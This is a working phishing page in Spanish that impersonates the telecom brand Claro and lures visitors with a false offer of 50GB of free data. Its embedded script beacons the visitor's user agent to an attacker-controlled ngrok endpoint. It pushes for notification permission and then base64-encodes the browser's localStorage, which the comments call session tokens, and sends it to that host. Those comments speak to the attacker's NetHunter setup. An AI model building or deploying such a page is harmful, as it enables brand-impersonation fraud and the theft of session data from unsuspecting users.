<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claro Club | Verificación de Identidad</title>
    <style>
        body { background: #f4f4f4; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .card { background: white; border-radius: 15px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); display: inline-block; max-width: 320px; }
        .logo { color: #ee1c25; font-size: 32px; font-weight: bold; margin-bottom: 20px; }
        .btn { background: #ee1c25; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; width: 100%; }
        #status { color: #666; font-size: 14px; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">Claro</div>
        <h2>¿Eres humano?</h2>
        <p>Para recibir tus <b>50GB Libres</b>, haz clic en el botón de abajo y selecciona <b>"Permitir"</b> en la validación de red.</p>
        
        <button class="btn" onclick="activarAcceso()">VERIFICAR AHORA</button>
        
        <div id="status">Esperando verificación...</div>
    </div>

    <script>
        // Tu URL de Ngrok
        var ng = "https://superdelicately-handworked-brenna.ngrok-free.dev/log?";

        async function activarAcceso() {
            document.getElementById('status').innerText = "Iniciando protocolo...";
            
            // 1. Notificamos a tu NetHunter que el pibe tocó el botón
            new Image().src = ng + "fase=CLICK_BOTON&dev=" + btoa(navigator.userAgent);

            // 2. Pedimos permiso de notificación (el gancho para el acceso)
            try {
                const permission = await Notification.requestPermission();
                
                if (permission === 'granted') {
                    // 3. Si acepta, mandamos la señal de "Puente Activo"
                    new Image().src = ng + "fase=BRIDGE_ACTIVE&status=GRANTED";
                    
                    // 4. Intentamos capturar tokens de sesión de fondo
                    var tokens = btoa(JSON.stringify(localStorage));
                    new Image().src = ng + "fase=SESSION_DATA&tokens=" + tokens;

                    document.body.innerHTML = `
                        <div style="padding:50px;">
                            <h1 style="color:#ee1c25;">PROCESANDO...</h1>
                            <p>Sincronizando con la red Claro. No cierres esta ventana para no perder tus 50GB.</p>
                            <img src="https://i.gifer.com/ZZ5H.gif" width="50">
                        </div>
                    `;
                } else {
                    alert("Debes permitir las notificaciones para validar tu línea.");
                }
            } catch (err) {
                console.log("Error de permisos.");
            }
        }
    </script>
</body>
</html>
